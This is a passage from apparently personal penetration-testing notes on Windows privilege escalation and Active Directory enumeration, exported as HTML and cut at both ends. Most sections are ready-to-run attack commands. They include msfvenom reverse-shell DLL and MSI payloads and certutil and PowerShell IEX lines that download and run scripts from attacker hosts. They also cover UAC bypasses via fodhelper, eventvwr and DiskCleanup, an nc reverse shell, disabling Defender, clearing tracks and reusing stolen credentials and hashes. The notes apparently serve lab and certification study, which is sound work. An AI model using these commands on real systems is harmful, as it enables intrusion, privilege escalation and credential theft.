msfvenom:</span></p><p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.3.155 LPORT=9001 -f dll &gt; hijacked.dll</p><p></p><p></p><p><span style="color:#404040;">now on victim:</span></p><p><span style="color:#404040;">got to Temp directory or any other more subtle place where you can get files uploaded to</span></p><p></p><p>powershell</p><p>certutil -urlcache -split -f &quot;http://10.9.3.155/hijacked.dll C:\temp\hijacked.dll</p><p></p><p>sc query dllsvc</p><p>sc stop dllsvc</p><p>sc start dllsvc</p><p> </p><p> whoami</p><p> </p><p> :)</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Registry_Attacks_303.html"></a><h1 class='title level-6'>Registry Attacks</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Registry_Attacks--Weak_Registry_Permissions_297.html"></a><h1 class='title level-7'>Weak Registry Permissions</h1><br/><p> .\winPEASany.exe servicesinfo</p><p></p><p><img src="images/297-1.png" alt="images/297-1.png" /></p><p></p><p><span style="color:#3f4043;">It seems we have full control over the registry entrys of this particular service. Whoopsies!</span></p><p></p><p><span style="color:#3f4043;">Let&#39;s further inspect this registry entry:</span></p><p>accesschk64.exe /accepteula -uwqvk HKLM\System\CurrentControlSet\Services\regsvc</p><p></p><p><span style="color:#3f4043;">(sometimes you need this powershell variant to see it)</span></p><p>Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl</p><p><small>&quot;NT </small><span style="color:#3f4043;">AUTHORITY\INTERACTIVE&quot; group (essentially all logged-on users)</span><small>:</small></p><p></p><p><span style="color:#3f4043;">The regsvc service is writable by the &quot;NT AUTHORITY\INTERACTIVE&quot; group (essentially all logged-on users). So let&#39;s modify it&#39;s ImagePath:</span></p><p>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\users\user\jaja\reverse.exe /f</p><p></p><p><span style="color:#3f4043;">We too have permissions to start the service, so let&#39;s trigger our payload! :)</span></p><p></p><p><span style="color:#3f4043;">Listener:</span></p><p>rlwrap nc -lvnp 443</p><p></p><p><span style="color:#3f4043;">Run service:</span></p><p>net start regsvc</p><p><span style="color:#3f4043;">or</span></p><p>sc.exe start regsvc</p><p></p><p><img src="images/297-2.png" alt="images/297-2.png" /></p><p></p><p><span style="color:#3f4043;">Lovely.</span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Registry_Attacks--Registry_-_AlwaysInstallElevated_299.html"></a><h1 class='title level-7'>Registry - AlwaysInstallElevated</h1><br/><p><span style="color:#3f4043;">With always Install Elevated, we can create a malicos msi payload and trigger it for an elevated session as AlwaysInstallElevated allows you to run msi files in a high privileged user context.</span></p><p></p><p><span style="color:#3f4043;">Query the registry for AlwaysInstallElevated keys:</span></p><p>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p><p>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p><p><span style="color:#3f4043;">I believe both needs to be set to 0x1 for it to work, but perhaps only 1 works too.</span></p><p></p><p><span style="color:#3f4043;">Next, we can create our malicous msi exeutable and run it with in a high privileged context</span>:</p><p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.31.108 LPORT=443 -f msi -o reverse.msi</p><p></p><p><span style="color:#3f4043;">Now let&#39;s prep our listener and run the executable:</span></p><p>msiexec /quiet /qn /i \\TSCLIENT\share\reverse.msi</p><p></p><p><img src="images/299-1.png" alt="images/299-1.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Password_Attacks_304.html"></a><h1 class='title level-6'>Password Attacks</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Password_Attacks--Passwords_-_Registry_300.html"></a><h1 class='title level-7'>Passwords - Registry</h1><br/><p><span style="color:#3f4043;">Enumerating saved creds:</span></p><p></p><p>.\winPEASany.exe windowscreds</p><p>.\winPEASany.exe filesinfo</p><p></p><p><span style="color:#3f4043;">In first command, didn&#39;t find much interesting. Just the hash of our current user, not very helpful for privesc.</span></p><p></p><p><span style="color:#3f4043;">In filesinfo however, we found this:</span></p><p><img src="images/300-1.png" alt="images/300-1.png" /></p><p></p><p><span style="color:#3f4043;">and this: (base64 encoded password string for presumably the admin user in the Unattend.xml file)</span></p><p></p><p><img src="images/300-2.png" alt="images/300-2.png" /></p><p><span style="color:#3f4043;">This might prove very useful. Perhaps get a session with rdp, winrm, or psexec etc. </span></p><p></p><p></p><p>evil-</p><p> -i 10.10.227.97 -u admin -p password123</p><p><img src="images/300-3.png" alt="images/300-3.png" /></p><p></p><p></p><p>impacket-psexec admin:&#39;password123&#39;@10.10.227.97 </p><p><img src="images/300-4.png" alt="images/300-4.png" /></p><p></p><p>As you can see ps-exec is preferable if you can use it as it grants you nt autority/system privileges if can access</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Password_Attacks--Passwords_-_Saved_Creds_301.html"></a><h1 class='title level-7'>Passwords - Saved Creds</h1><br/><p>List any saved credentials:</p><p>cmdkey /list</p><p></p><p><img src="images/301-1.png" alt="images/301-1.png" /></p><p></p><p><span style="color:#3f4043;">Run our shell with the admin account&#39;s saved credentials for spawning a new high privileged shell: (This attack is not always stable.)</span></p><p>runas /savecred /user:admin C:\Users\user\reverse.exe</p><p></p><p><span style="color:#3f4043;">Whenever you get a shell as a user who&#39;s a part of the administrators group, this is where UAC bypass usually comes in handy.  </span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--PrintNightmare_312.html"></a><h1 class='title level-6'>PrintNightmare</h1><br/><p><span style="color:#3f4043;">PrintNightmare</span></p><p><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></p><p></p><p><span style="color:#3f4043;">Enumerate spoolsv. It&#39;s usually located here:</span></p><p>icacls.exe &quot;C:\Windows\System32\spoolsv.exe&quot;</p><p></p><p>powershell -ep bypass . \10.13.31.108\share\CVE-2021-1675.ps1;Invoke-Nightmare </p><p></p><p><img src="images/312-1.png" alt="images/312-1.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass_248.html"></a><h1 class='title level-6'>UAC Bypass</h1><br/><p><a href="https://tryhackme.com/room/bypassinguac">https://tryhackme.com/room/bypassinguac</a></p><p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p></p><p><span style="color:#3f4043;">manual uac bypass:</span></p><p><a href="https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/">https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/</a> </p><p></p><p><h2>Enumeration:</h2></p><p></p><p>whoami /groups</p><p></p><p><span style="color:#3f4043;">If you you have &quot;Medium Mandatory Level&quot; mean you can run stuff as Admin.</span></p><p></p><p><span style="color:#3f4043;">But a popup will ask you to press &quot;yes&quot;, and since we don&#39;t have RDP or graphical session available to us, we need to perform UAC bypass to circumwent this in our privesc this time.</span></p><p></p><p></p><p><span style="color:#3f4043;">Run from the command prompt</span></p><p></p><p>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA</p><p><span style="color:#3f4043;">if you get</span></p><p></p><p><span style="color:#3f4043;">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">    EnableLUA    REG_DWORD    0x1</span></p><p>    </p><p><span style="color:#3f4043;">UAC is enabled, but if you get</span></p><p></p><p><span style="color:#3f4043;">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">    EnableLUA    REG_DWORD    0x0</span></p><p>    </p><p><span style="color:#3f4043;">UAC is disabled.</span></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass--GUI_based_UAC_bypass_285.html"></a><h1 class='title level-7'>GUI based UAC bypass</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass--GUI_based_UAC_bypass--msconfig_286.html"></a><h1 class='title level-8'>msconfig</h1><br/><p>windows key + r</p><p>msconfig</p><p></p><p><img src="images/286-1.png" alt="images/286-1.png" /></p><p></p><p><span style="color:#3f4043;">When hitting launch, we&#39;re essentially running an administrative cmd shell as that&#39;s who the process is being ran by, and in many cases you won&#39;t even get a UAC prompt to verify as admin with credentials. From here you can drop hashes and whatnot. Cheers </span></p><p></p><p><span style="color:#3f4043;">You can do a whoami /all to verify the changes in privelege immediately too. </span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass--GUI_based_UAC_bypass--azman.msc_287.html"></a><h1 class='title level-8'>azman.msc</h1><br/><p>windows key + r </p><p>azman.msc</p><p></p><p><span style="color:#3f4043;">Go to:</span></p><p><ul><li>Help -&gt; Help Topics</li><li>Right click anywhere blank on page -&gt; “View Source&quot;</li><li>In the notepad, click file -&gt; open</li><li>Then from there, open C:\Windows\System32\cmd.exe</li></ul></p><p></p><p></p><p><img src="images/287-1.png" alt="images/287-1.png" /></p><p></p><p></p><p><img src="images/287-2.png" alt="images/287-2.png" /></p><p></p><p></p><p><span style="color:#3f4043;">No UAC prompt. Just a beautiful elevated cmdshell. Cheers</span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass--AutoElevate_Privesc_288.html"></a><h1 class='title level-7'>AutoElevate Privesc</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass--AutoElevate_Privesc--Fodhelper_289.html"></a><h1 class='title level-8'>Fodhelper</h1><br/><p><span style="color:#3f4043;">Fodhelper</span></p><p></p><p></p><p><span style="color:#3f4043;">Check if auto elevate is linked to this particular executable:</span></p><p>powershell -C Get-Content -Path C:\Windows\System32\fodhelper.exe | findstr /I &quot;autoElevate&quot;</p><p></p><p><span style="color:#3f4043;">Next, we need to be cmd.exe for these registry settings</span></p><p></p><p><span style="color:#3f4043;">Now we set some registry keys to abuse this weaknesses and use it&#39;s autoelevate and it&#39;s high Integrity level to escalate our priveleges:</span></p><p>set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command</p><p>set CMD=&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <a href="https://8bqmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)">https://8bqmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)</a>&quot;</p><p>reg add %REG_KEY% /v &quot;DelegateExecute&quot; /d &quot;&quot; /f</p><p>reg add %REG_KEY% /d %CMD% /f</p><p></p><p><span style="color:#3f4043;">Time to start a listener and get high priveleged integrity level:</span></p><p>rlwrap nc -lvnp 443</p><p>fodhelper.exe</p><p></p><p><span style="color:#3f4043;">Clearing our tracks:</span></p><p>reg delete HKCU\Software\Classes\ms-settings\ /f</p><p></p><p></p><p>===============</p><p></p><p><span style="color:#3f4043;">from fodhelper uac bypass with powershell</span></p><p></p><p></p><p>New-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force</p><p>New-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -Force</p><p>Set-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass C:\users\ryan\desktop\ninja22.ps1&quot; -Force</p><p></p><p>Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot; -WindowStyle Hidden</p><p></p><p><span style="color:#3f4043;">Turn off AV</span></p><p>Set-MpPreference -DisableRealtimeMonitoring $true</p><p></p><p>==</p><p></p><p>==</p><p>Set-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <a href="https://8bqmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)">https://8bqmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)</a>&quot; -Force</p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass--AutoElevate_Privesc--Eventvwr_290.html"></a><h1 class='title level-8'>Eventvwr</h1><br/><p><span style="color:#3f4043;">Eventwr</span></p><p></p><p><span style="color:#3f4043;">Check if auto elevate is linked to this particular executable:</span></p><p>powershell -C Get-Content -Path C:\Windows\System32\eventvwr.exe | findstr /I &quot;autoElevate&quot;</p><p></p><p><span style="color:#3f4043;">Next, we need to be cmd.exe for these registry settings</span></p><p>REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command</p><p></p><p>REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /v DelegateExecute /t REG_SZ</p><p></p><p>REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d &quot;c:\windows\tasks\nc64.exe -nv 10.8.24.10 443 -e cmd.exe&quot; /f</p><p></p><p>rlwrap nc -lvnp 445  (on kali ofc)</p><p></p><p>eventvwr</p><p></p><p></p><p></p><p>Set-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass C:\users\robert\downloads\work2\obfuscated.ps1&quot; -Force</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass--Environment_variables_291.html"></a><h1 class='title level-7'>Environment variables</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass--Environment_variables--DiskCleanup_292.html"></a><h1 class='title level-8'>DiskCleanup</h1><br/><p><span style="color:#3f4043;">Add our malicous commands in environmental registry hive:</span></p><p>reg add &quot;HKCU\Environment&quot; /v &quot;windir&quot; /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <a href="https://8bqmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)">https://8bqmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)</a> &quot; /f</p><p></p><p><span style="color:#3f4043;">Force the service to start and trigger it&#39;s corresponding attributes:</span></p><p>schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I</p><p></p><p><span style="color:#3f4043;">With our listener active before the last command, we will give yet our shell as a high integrity session given sufficient real time prevention is not sufficiently in place.</span></p><p></p><p><span style="color:#3f4043;">Clearing our tracks:</span></p><p>reg delete &quot;HKCU\Environment&quot; /v &quot;windir&quot; /f</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--UAC_Bypass--UAC_Bypass_CMSTPLUA.86.exe_956.html"></a><h1 class='title level-7'>UAC Bypass CMSTPLUA.86.exe</h1><br/><p><a href="https://github.com/tijme/cmstplua-uac-bypass/blob/master/UACBypassCMSTPLUA.x86.exe">https://github.com/tijme/cmstplua-uac-bypass/blob/master/UACBypassCMSTPLUA.x86.exe</a></p><p></p><p>this bypasses uac today somehow, even tho over 2 yrs old</p><p> </p><p>usage: UACBypassCMSTPLUA.x86.exe cmd /k whoami</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Scheduled_Tasks_302.html"></a><h1 class='title level-6'>Scheduled Tasks</h1><br/><p></p><p><span style="color:#3f4043;">interesting scheduled tasks</span></p><p>powershell -c &quot;Get-ScheduledTask | where {$_.TaskPath -notlike &#39;\Microsoft*&#39;} | Format-Table TaskName,TaskPath,State&quot;</p><p></p><p><span style="color:#3f4043;">more info on task</span></p><p>schtasks /query /tn &quot;TASK_NAME&quot; /V /FO LIST</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">I know of no automated way to find vulnerable scheduled tasks. Will have to be found rather manually I believe.</span></p><p></p><p><span style="color:#3f4043;">View the contents of the C:\DevTools\CleanUp.ps1 script:</span></p><p></p><p>type C:\DevTools\CleanUp.ps1</p><p></p><p><span style="color:#3f4043;">The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:</span></p><p></p><p>C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1</p><p></p><p><span style="color:#3f4043;">Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1¬†which runs the reverse.exe executable you created:</span></p><p></p><p>echo C:\PrivEsc\reverse.exe &gt; C:\DevTools\CleanUp.ps1</p><p></p><p><span style="color:#3f4043;">Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.</span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Windows_XP_309.html"></a><h1 class='title level-6'>Windows XP</h1><br/><p><a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">https://sohvaxus.github.io/content/winxp-sp1-privesc.html</a></p><p></p><p><span style="color:#3f4043;">older accesschk, and common privesc</span></p><p><a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">https://sohvaxus.github.io/content/winxp-sp1-privesc.html</a></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Brower_Credential_Gathering_362.html"></a><h1 class='title level-6'>Brower Credential Gathering</h1><br/><p>Credential gathering:</p><p></p><p>Chromium:</p><p><a href="https://github.com/djhohnstein/SharpChromium">https://github.com/djhohnstein/SharpChromium</a></p><p></p><p>Firefox:</p><p><a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology_105.html"></a><h1 class='title level-4'>Active Directory Methdology</h1><br/><p><a href="https://book.hacktricks.xyz/windows/active-directory-methodology">https://book.hacktricks.xyz/windows/active-directory-methodology</a></p><p><a href="https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/">https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/</a></p><p></p><p><span style="color:#3f4043;">ad attack series:</span></p><p><a href="https://www.youtube.com/playlist?list=PLPDUz8KkxR5z2z84CJ1JyLXC9JgxkjPBk">https://www.youtube.com/playlist?list=PLPDUz8KkxR5z2z84CJ1JyLXC9JgxkjPBk</a>  </p><p></p><p></p><p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></p><p><a href="https://github.com/PowerShellMafia/PowerSploit.git">https://github.com/PowerShellMafia/PowerSploit.git</a></p><p></p><p><a href="https://attack.stealthbits.com/">https://attack.stealthbits.com/</a></p><p></p><p><span style="color:#234141;">These are all great. Use them. </span></p><p></p><p><span style="color:#234141;">Check for all the exploits in the exploit section and the manual enumeration too if needed.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Take good notes as well.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">====</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span>whoami /all</p><p>net users /domain</p><p>net user john /domain</p><p>systeminfo<span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">We want to enumerate smb, ldap, rpc, and kerberos related instances.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Enumerate users through enum4linux-ng, kerbrute, rpc, impacket-lookupsid, crackmapexec rid-brute, and potentially through ldap nmap script, see what you can find.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Perform common attacks, see what you can find. Getting responder up listening early tends to be a good idea.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">If you get any hashes, crack the hashes and store them. </span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">If you can&#39;t get anywhere further, see if you&#39;ve enumerated properly. If you have, then attempt brute forcing what you can. (Keep lockout policy in mind.)</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Lastly, if you find full credential-sets, attempt them across RDP, winrm, psexec, and rpcclient. At least one of these should work. (Keep in mind potential honeypots.)</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Now, there&#39;s a lot you can do with initial credentials. Perform new common attacks you can now do in this position, and get bloodhound up to see how far you can get using policies and trusts to your advantage.</span></p><p></p><p><span style="color:#234141;">:)</span></p><p></p><p><span style="color:#3f4043;"> Attacking kerberos:</span> <a href="https://www.tarlogic.com/blog/how-to-attack-kerberos/">https://www.tarlogic.com/blog/how-to-attack-kerberos/</a></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration_106.html"></a><h1 class='title level-5'>Enumeration</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--Enum4linux-ng_169.html"></a><h1 class='title level-6'>Enum4linux-ng</h1><br/><p><a href="https://github.com/cddmp/enum4linux-ng">https://github.com/cddmp/enum4linux-ng</a></p><p></p><p><span style="color:#234141;">This is the new and improved version of enum4linux. Might be useful to run both as sometimes the one might find different information than to the other. Can be used to gather tons of data on the system. It can find group policies, password policies, domain names and a lot more. It can find userlists which can be very useful for attacks like password spraying and pass the hash.</span></p><p></p><p><span style="color:#234141;">Scans rpc, smb OS info and some more. Very useful tool </span></p><p>enum4linux-ng 10.10.253.194 | tee enum4liunux</p><p></p><p>enum4linux -a $IP</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--User_discovery_172.html"></a><h1 class='title level-6'>User discovery</h1><br/></div><div class='page'><a name="--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--User_discovery--enum4linux-ng_null_&_guest_session_199.html"></a><h1 class='title level-7'>enum4linux-ng null & guest session</h1><br/><p><a href="https://github.com/cddmp/enum4linux-ng">https://github.com/cddmp/enum4linux-ng</a></p><p></p><p><span style="color:#234141;">This is the new and improved version of enum4linux. Might be useful to run both as sometimes the one might find different information than to the other. Can be used to gather tons of data on the system. It can find group policies, password policies, domain names and a lot more. It can find userlists which can be very useful for attacks like password spraying and pass the hash.</span></p><p></p><p><span style="color:#234141;">Scans rpc, smb OS info and some more. Very useful tool </span></p><p>enum4linux-ng -A 10.10.253.194 | tee enum4liunux</p><p></p><p>enum4linux -a $IP</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--User_discovery--netexec_rid-brute_188.html"></a><h1 class='title level-7'>netexec rid-brute</h1><br/><p><span style="color:#234141;">After getting your first credentials on the domain, this will brute force sid and rid to optain initial user and group information. </span></p><p>netexec smb 10.10.253.194 -u &#39;twilliams&#39; -p &#39;roastpotatoes&#39; --rid-brute | tee crackmapexec-rid-brute</p><p></p><p>Sometimes works without creds:</p><p>netexec smb 10.10.253.194 -u &#39;guest&#39; -p &#39;&#39; --rid-brute | tee crackmapexec-rid-brute</p><p>netexec smb $target -u &#39;guest&#39; -p &#39;&#39; --rid-brute | grep -i &#39;sidtypeuser&#39; | awk &#39;{print$6}&#39; | cut -d &#39;\&#39; -f2 | tee userlist2.txt</p><p></p><p>netexec smb $target -u leicester.lawton -H 25cac0569934a5f6e01e9e440e0dce5b --users | awk &#39;{print$ 5}&#39; | fgrep -v &#39;[*]&#39; | tee users2</p><p></p><p><img src="images/188-1.png" alt="images/188-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--User_discovery--impacket_lookup_sid_173.html"></a><h1 class='title level-7'>impacket lookup sid</h1><br/><p><a href="https://kavishgr.gitbook.io/kavishgour/windows/sid-rid-bruteforce-with-pythons-impacket">https://kavishgr.gitbook.io/kavishgour/windows/sid-rid-bruteforce-with-pythons-impacket</a></p><p></p><p><span style="color:#234141;">We&#39;re here bruteforcing SIDs at the domain through utilizing anonymous login through rpc, and then taking this output to usernames files using tee</span></p><p>impacket-lookupsid anonymous@10.10.212.32 | tee usernames</p><p>impacket-lookupsid &quot;&quot;:&quot;&quot;@10.10.200.245 | tee usernames</p><p></p><p>impacket-lookupsid &#39;guest&#39;@10.10.129.91</p><p></p><p><img src="images/173-1.png" alt="images/173-1.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--User_discovery--Kerbrute_for_usernames_171.html"></a><h1 class='title level-7'>Kerbrute for usernames</h1><br/><p></p><p><a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p><p></p><p>git clone <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p><p>make all</p><p></p><p>cp /opt/kerbrute/dist/kerbrute . </p><p></p><p><span style="color:#234141;">Kerbrute does it&#39;s username enumeration through kerberos. Whilst a tool like enum4linux gets it through RPC. Worth noting. Test both.</span></p><p></p><p><span style="color:#234141;">Specify domain and userfile you wanna use and let it do its magic(I don&#39;t think this could cause lock-out policy events trigger, but keep it in mind. Also, on a red team assessment keep in mind one the users could be a honeypot that would alert them, food for thought ;;_))</span></p><p></p><p>kerbrute userenum /usr/share/seclists/Usernames/Names/names.txt --dc 10.10.86.201 -d THM-AD</p><p></p><p><span style="color:#234141;"></span></p><p><span style="color:#234141;">To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. ... However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts.</span></p><p></p><p></p><p>Use this tool to take full names and create different possible AD usernames from: give it a list with format of julia thompson etc...</p><p>git clone <a href="https://github.com/mohinparamasivam/AD-Username-Generator">https://github.com/mohinparamasivam/AD-Username-Generator</a></p><p></p><p>python3 username-generate.py -u names.txt -o generated_users.txt</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--User_discovery--nmap-ldap-script_198.html"></a><h1 class='title level-7'>nmap-ldap-script</h1><br/><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-ldap">https://book.hacktricks.xyz/pentesting/pentesting-ldap</a></p><p></p><p>nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 $target</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--Bloodhound_108.html"></a><h1 class='title level-6'>Bloodhound</h1><br/><p>Bloodhound CE</p><p></p><p>curl -L <a href="https://ghst.ly/getbhce">https://ghst.ly/getbhce</a> -o docker-compose.yml</p><p>docker-compose pull &amp;&amp; docker-compose up -d</p><p>docker-compose logs bloodhound | grep -i passw</p><p></p><p>go to <a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a> with user admin and password u got</p><p></p><p>Js1!</p><p></p><p><a href="https://support.bloodhoundenterprise.io/hc/en-us/articles/16721164740251-Searching-with-Cypher">https://support.bloodhoundenterprise.io/hc/en-us/articles/16721164740251-Searching-with-Cypher</a></p><p></p><p>netexec ldap $target -u SQLService -p &#39;MYpassword123#&#39; --bloodhound --collection All --dns-server $target</p><p></p><p> </p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--adPEAS.ps1_249.html"></a><h1 class='title level-6'>adPEAS.ps1</h1><br/><p><a href="https://github.com/61106960/adPEAS">https://github.com/61106960/adPEAS</a></p><p>powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://192.168.119.208/adPEAS.ps1');Invoke-adPEAS">http://10.8.24.10/adPEAS.ps1&#39;);Invoke-adPEAS</a></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Active_Directory_Methdology--Enumeration--General_impacket_syntax_176.html"></a><h1 class='title level-6'>General impacket syntax</h1><br/><p></p><p><span style="color:#234141;">(You might have to change your time to sync with server. You can try this too: rdate -n 10.10.10.100, or this:</span><span style="color:#234141;"></span></p><p><span style="color:#234141;">ntpdate vulnnet-rst.local. Pausing VM and waiting some minutes and retrying over and over again with variations of this and some from here </span><a href="https://zweilosec.gitbook.io/htb-writeups/windows-machines/insane/apt">https://zweilosec.gitbook.io/htb-writeups/windows-machines/insane/apt</a><span style="color:#234141;"> fixed it eventually&lt;3, kinda lol.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Spamming 